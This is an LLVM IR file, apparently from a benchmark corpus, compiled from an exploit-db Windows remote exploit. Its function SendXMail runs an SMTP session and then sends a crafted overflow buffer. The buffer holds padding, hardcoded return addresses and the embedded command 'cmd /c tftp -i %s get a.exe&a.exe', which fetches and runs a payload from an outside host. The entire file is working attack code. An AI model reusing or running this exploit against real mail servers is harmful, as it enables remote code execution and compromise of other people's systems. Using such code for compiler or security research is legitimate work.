; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_164.c_SendXMail.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_164.c_SendXMail.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SMTPPORT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [14 x i8] c"connect err.\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"recv err.\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"HELO server\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"send err.\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"MAIL FROM: info@sina.com\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"RCPT TO: %s\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"DATA\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"send exploit mail...\0A\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"cmd /c tftp -i %s get a.exe&a.exe:\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"girl\0D\00", align 1
@packet = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [20 x i8] c"exploit mail sent.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @SendXMail(i8* %0, i8* %1, i8* %2, i8* %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [510 x i8], align 16
  %13 = alloca [65536 x i8], align 16
  %14 = alloca [500 x i8], align 16
  %15 = alloca [500 x i8], align 16
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %7, align 8
  %17 = load i32, i32* @SMTPPORT, align 4
  %18 = call i64 @Make_Connection(i8* %16, i32 %17, i32 10)
  store i64 %18, i64* %9, align 8
  %19 = load i64, i64* %9, align 8
  %20 = icmp slt i64 %19, 0
  br i1 %20, label %21, label %24

21:                                               ; preds = %4
  %22 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %4
  %25 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %26 = call i32 @memset(i8* %25, i32 0, i32 510)
  %27 = load i64, i64* %9, align 8
  %28 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %29 = call i32 @recv(i64 %27, i8* %28, i32 4096, i32 0)
  store i32 %29, i32* %10, align 4
  %30 = load i32, i32* %10, align 4
  %31 = icmp sle i32 %30, 0
  br i1 %31, label %32, label %35

32:                                               ; preds = %24
  %33 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %34 = call i32 @exit(i32 1) #3
  unreachable

35:                                               ; preds = %24
  %36 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %37 = call i32 @printf(i8* %36)
  %38 = load i64, i64* %9, align 8
  %39 = call i32 @strlen(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %40 = call i32 @send(i64 %38, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i32 %39, i32 0)
  store i32 %40, i32* %10, align 4
  %41 = load i32, i32* %10, align 4
  %42 = icmp sle i32 %41, 0
  br i1 %42, label %43, label %46

43:                                               ; preds = %35
  %44 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %45 = call i32 @exit(i32 1) #3
  unreachable

46:                                               ; preds = %35
  %47 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %48 = call i32 @memset(i8* %47, i32 0, i32 510)
  %49 = load i64, i64* %9, align 8
  %50 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %51 = call i32 @recv(i64 %49, i8* %50, i32 4096, i32 0)
  store i32 %51, i32* %10, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp sle i32 %52, 0
  br i1 %53, label %54, label %57

54:                                               ; preds = %46
  %55 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %56 = call i32 @exit(i32 1) #3
  unreachable

57:                                               ; preds = %46
  %58 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %59 = call i32 @printf(i8* %58)
  %60 = load i64, i64* %9, align 8
  %61 = call i32 @strlen(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %62 = call i32 @send(i64 %60, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0), i32 %61, i32 0)
  store i32 %62, i32* %10, align 4
  %63 = load i32, i32* %10, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %68

65:                                               ; preds = %57
  %66 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %67 = call i32 @exit(i32 1) #3
  unreachable

68:                                               ; preds = %57
  %69 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %70 = call i32 @memset(i8* %69, i32 0, i32 510)
  %71 = load i64, i64* %9, align 8
  %72 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %73 = call i32 @recv(i64 %71, i8* %72, i32 4096, i32 0)
  store i32 %73, i32* %10, align 4
  %74 = load i32, i32* %10, align 4
  %75 = icmp sle i32 %74, 0
  br i1 %75, label %76, label %79

76:                                               ; preds = %68
  %77 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %78 = call i32 @exit(i32 1) #3
  unreachable

79:                                               ; preds = %68
  %80 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %81 = call i32 @printf(i8* %80)
  %82 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %83 = load i8*, i8** %5, align 8
  %84 = call i32 @sprintf(i8* %82, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i8* %83)
  %85 = load i64, i64* %9, align 8
  %86 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %87 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %88 = call i32 @strlen(i8* %87)
  %89 = call i32 @send(i64 %85, i8* %86, i32 %88, i32 0)
  store i32 %89, i32* %10, align 4
  %90 = load i32, i32* %10, align 4
  %91 = icmp sle i32 %90, 0
  br i1 %91, label %92, label %95

92:                                               ; preds = %79
  %93 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %94 = call i32 @exit(i32 1) #3
  unreachable

95:                                               ; preds = %79
  %96 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %97 = call i32 @memset(i8* %96, i32 0, i32 510)
  %98 = load i64, i64* %9, align 8
  %99 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %100 = call i32 @recv(i64 %98, i8* %99, i32 4096, i32 0)
  store i32 %100, i32* %10, align 4
  %101 = load i32, i32* %10, align 4
  %102 = icmp sle i32 %101, 0
  br i1 %102, label %103, label %106

103:                                              ; preds = %95
  %104 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %105 = call i32 @exit(i32 1) #3
  unreachable

106:                                              ; preds = %95
  %107 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %108 = call i32 @printf(i8* %107)
  %109 = call i32 @Sleep(i32 1000)
  %110 = load i64, i64* %9, align 8
  %111 = call i32 @strlen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %112 = call i32 @send(i64 %110, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i32 %111, i32 0)
  store i32 %112, i32* %10, align 4
  %113 = load i32, i32* %10, align 4
  %114 = icmp sle i32 %113, 0
  br i1 %114, label %115, label %118

115:                                              ; preds = %106
  %116 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %117 = call i32 @exit(i32 1) #3
  unreachable

118:                                              ; preds = %106
  %119 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %120 = call i32 @memset(i8* %119, i32 0, i32 510)
  %121 = load i64, i64* %9, align 8
  %122 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %123 = call i32 @recv(i64 %121, i8* %122, i32 4096, i32 0)
  store i32 %123, i32* %10, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp sle i32 %124, 0
  br i1 %125, label %126, label %129

126:                                              ; preds = %118
  %127 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %128 = call i32 @exit(i32 1) #3
  unreachable

129:                                              ; preds = %118
  %130 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %131 = call i32 @printf(i8* %130)
  %132 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0))
  %133 = getelementptr inbounds [65536 x i8], [65536 x i8]* %13, i64 0, i64 0
  %134 = call i32 @memset(i8* %133, i32 0, i32 65536)
  %135 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %136 = call i32 @memset(i8* %135, i32 0, i32 510)
  %137 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %138 = call i32 @memset(i8* %137, i32 65, i32 509)
  %139 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %140 = call i32 @memset(i8* %139, i32 0, i32 500)
  %141 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %142 = load i8*, i8** %8, align 8
  %143 = call i32 @strcpy(i8* %141, i8* %142)
  %144 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %145 = call i32 @strcat(i8* %144, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0))
  %146 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %147 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %148 = load i8*, i8** %6, align 8
  %149 = call i32 @sprintf(i8* %146, i8* %147, i8* %148)
  %150 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %151 = getelementptr inbounds i8, i8* %150, i64 256
  %152 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %153 = call i32 @strlen(i8* %152)
  %154 = sext i32 %153 to i64
  %155 = sub i64 0, %154
  %156 = getelementptr inbounds i8, i8* %151, i64 %155
  %157 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %158 = getelementptr inbounds [500 x i8], [500 x i8]* %15, i64 0, i64 0
  %159 = call i32 @strlen(i8* %158)
  %160 = call i32 @memcpy(i8* %156, i8* %157, i32 %159)
  %161 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %162 = getelementptr inbounds i8, i8* %161, i64 256
  %163 = bitcast i8* %162 to i32*
  store i32 2147112141, i32* %163, align 4
  %164 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %165 = getelementptr inbounds i8, i8* %164, i64 260
  %166 = bitcast i8* %165 to i32*
  store i32 -2132049685, i32* %166, align 4
  %167 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %168 = getelementptr inbounds i8, i8* %167, i64 264
  %169 = bitcast i8* %168 to i32*
  store i32 2147349024, i32* %169, align 4
  %170 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %171 = getelementptr inbounds i8, i8* %170, i64 272
  %172 = bitcast i8* %171 to i32*
  store i32 2147349024, i32* %172, align 4
  %173 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %174 = call i32 @memcpy(i8* %173, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i32 5)
  %175 = getelementptr inbounds [65536 x i8], [65536 x i8]* %13, i64 0, i64 0
  %176 = load i64, i64* @packet, align 8
  %177 = inttoptr i64 %176 to i8*
  %178 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %179 = call i32 @sprintf(i8* %175, i8* %177, i8* %178)
  %180 = load i64, i64* %9, align 8
  %181 = getelementptr inbounds [65536 x i8], [65536 x i8]* %13, i64 0, i64 0
  %182 = getelementptr inbounds [65536 x i8], [65536 x i8]* %13, i64 0, i64 0
  %183 = call i32 @strlen(i8* %182)
  %184 = call i32 @send(i64 %180, i8* %181, i32 %183, i32 0)
  store i32 %184, i32* %10, align 4
  %185 = load i32, i32* %10, align 4
  %186 = icmp sle i32 %185, 0
  br i1 %186, label %187, label %190

187:                                              ; preds = %129
  %188 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %189 = call i32 @exit(i32 1) #3
  unreachable

190:                                              ; preds = %129
  %191 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %192 = call i32 @memset(i8* %191, i32 0, i32 510)
  %193 = load i64, i64* %9, align 8
  %194 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %195 = call i32 @recv(i64 %193, i8* %194, i32 4096, i32 0)
  store i32 %195, i32* %10, align 4
  %196 = load i32, i32* %10, align 4
  %197 = icmp sle i32 %196, 0
  br i1 %197, label %198, label %201

198:                                              ; preds = %190
  %199 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %200 = call i32 @exit(i32 1) #3
  unreachable

201:                                              ; preds = %190
  %202 = getelementptr inbounds [510 x i8], [510 x i8]* %12, i64 0, i64 0
  %203 = call i32 @printf(i8* %202)
  %204 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0))
  %205 = load i64, i64* %9, align 8
  %206 = call i32 @closesocket(i64 %205)
  ret i32 0
}

declare dso_local i64 @Make_Connection(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i64, i8*, i32, i32) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @closesocket(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
